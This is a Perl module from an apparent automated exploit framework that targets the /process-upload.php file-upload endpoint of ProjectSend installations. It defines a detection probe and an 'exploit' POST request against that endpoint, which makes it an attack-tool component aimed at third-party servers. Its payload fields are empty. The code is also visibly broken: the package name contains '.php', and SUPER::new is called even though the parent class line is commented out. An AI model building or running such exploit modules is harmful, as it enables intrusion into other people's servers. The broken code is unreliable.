package MSFExploits::Exploits::PROJECTSEND::MSF::s0877d5HOPM9eP7.php;
# use parent qw(MSFExploits::Exploit MSFExploits::Services::PROJECTSEND);

use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use URI::URL;
use Data::Dump qw(dump);
use Coro qw( async );

# # use MSFExploits::Functions::Basic;
# # use MSFExploits::Functions::Errors;
# # use MSFExploits::Functions::Content;

sub load {
    my $type  = shift;
    my $class = ref $type || $type;
    my $self = { };
    bless $self, $class;

    return $self;
}

sub new {
   my $class = shift;
   my ( $requester, $database ) = @_;

   my $name = "s0877d5HOPM9eP7.php";

   my $DETECTION = {
  METHOD => 'POST',
  PATH => '/process-upload.php',
  PAYLOAD => '',
  TEXT => 'Checking If : /process-upload.php Exists ...',
  VALIDATION   => {
    TCODE => ['200'],
  },
   };

   my $EXPLOIT = {
  TYPE => 'MSF',
  PLATFORM => 'UNIX',
  REQUESTS => {
    EXPLOIT2 => {
      METHOD       => 'POST',
      PATH   => 'process-upload.php',
      PAYLOAD      => '',
      TEXT   => 'Sending Exploit #2 Request : [POST] /process-upload.php',
      HEADERS      => {
        'Content-Type' => 'multipart/form-data; boundary=_Part_94_1271618550_3193907166',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
  },
   };

   return $class->SUPER::new($requester, $database, $name, $DETECTION, $EXPLOIT, @_);
}

return 1;
